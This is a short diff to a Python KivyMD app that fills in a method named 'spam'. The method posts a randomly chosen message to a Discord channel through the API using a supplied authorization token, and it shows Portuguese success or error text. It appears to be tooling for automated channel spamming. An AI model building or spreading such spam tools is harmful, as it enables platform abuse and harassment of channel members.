@@ -95,8 +95,18 @@ MDFloatLayout:
 class auto(MDApp, App):
     
     def spam(self, *args):
-    	self.root.ids.mens.text = "Error\nVerifique seu token ou o id"
-    	pass
+    	
+    	
+    	url = f"https://discord.com/api/v10/channels/{chat}/messages"
+    	header = {"authorization": token}
+    	payload = {'content': texto[random.randint(0, 2)]}
+    	r = requests.post(f'https://discord.com/api/v10/channels/{chat}/messages', data=payload, headers=header)
+    	try:
+    		print(r.json()["content"])
+    		self.root.ids.mens.text = "Sucesso"
+    	except:
+    		self.root.ids.mens.text = "Error\nVerifique seu token ou o id"
+    		pass
     
     
     
